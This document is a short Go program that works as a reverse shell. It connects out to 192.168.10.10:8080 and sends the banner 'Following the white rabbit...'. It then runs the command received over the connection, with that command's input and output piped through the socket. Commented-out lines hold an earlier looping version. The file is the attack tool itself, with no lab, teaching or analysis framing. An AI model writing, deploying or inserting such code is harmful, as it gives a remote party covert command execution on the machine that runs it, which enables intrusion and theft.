package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {

	conn, err := net.Dial("tcp", "192.168.10.10:8080")

	if err != nil {
		log.Println(err)
		return
	}

	buffer := bufio.NewWriter(conn)
	buffer.WriteString("Following the white rabbit... \n\r")
	buffer.Flush()

	// for {

	msg, _ := bufio.NewReader(conn).ReadString('\n')
	// out, err := exec.Command(strings.TrimSuffix(msg, "\n")).Output()

	// if err != nil {
	// fmt.Fprintf(conn, "%s\n", err)
	// }
	//
	// fmt.Fprintf(conn, "[>>] %s", out)

	out := exec.Command(strings.TrimSuffix(msg, "\n"))
	out.Stdin = conn
	out.Stdout = conn
	out.Stderr = conn
	out.Run()
	// }
}
